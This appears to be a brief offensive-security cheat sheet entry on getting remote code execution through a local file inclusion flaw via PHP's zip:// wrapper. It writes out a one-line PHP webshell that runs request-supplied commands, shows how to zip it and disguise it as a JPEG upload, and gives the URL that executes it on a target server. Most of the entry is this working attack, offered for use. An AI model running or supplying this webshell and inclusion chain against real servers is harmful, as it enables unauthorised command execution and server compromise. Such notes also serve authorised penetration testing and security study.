# Zip Wrappers

---

If we uploaded a simple php webshell to the website, the website would create a zip file with the php webshell in the zip file. After that we are able to obtain remote code execution using the zip wrapper LFI.

## Syntax

```
echo "<?php system($_REQUEST['cmd']); ?>" > payload.php
zip payload.zip payload.php
mv payload.zip shell.jpg

http://example.com/index.php?page=zip://shell.jpg%23payload.php
```

## PoC

Assuming we have an LFI and we successfully uploaded our webshell, but don't have access to it. We can utilize zip wrappers to access it and run malicious commands on the target server.
